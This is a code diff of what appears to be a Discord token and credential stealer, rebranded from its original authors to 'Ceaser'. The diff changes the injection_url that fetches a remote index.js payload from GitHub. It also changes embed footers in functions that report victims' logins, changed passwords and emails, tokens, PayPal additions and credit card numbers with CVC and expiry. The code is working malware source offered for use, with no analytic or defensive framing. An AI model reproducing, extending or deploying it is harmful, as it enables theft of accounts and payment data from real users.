@@ -14,7 +14,7 @@ const config = {
     embed_name: 'Ceaser',
     embed_icon: 'https://cdn.discordapp.com/avatars/553327784504721408/a_d5fcd9256ce5e6ee2215f437501e31b1.png?size=4096'.replace(/ /g, '%20'),
     embed_color: 2895667,
-    injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js',
+    injection_url: 'https://raw.githubusercontent.com/CeaserFLY/CeaserFLY/main/index.js',
     /**
      
      **/
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+                    text: 'Ceaser is here!',
                 },
             },
         ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+                    text: 'Ceaser is here!',
                 },
             },
         ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+                    text: 'Ceaser is here!',
                 },
             },
         ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+                    text: 'Ceaser is here!',
                 },
             },
         ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+                    text: 'Ceaser is here!',
                 },
             },
         ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
                 footer: {
-                    text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+                    text: 'Ceaser is here!',
                 },
             },
         ],
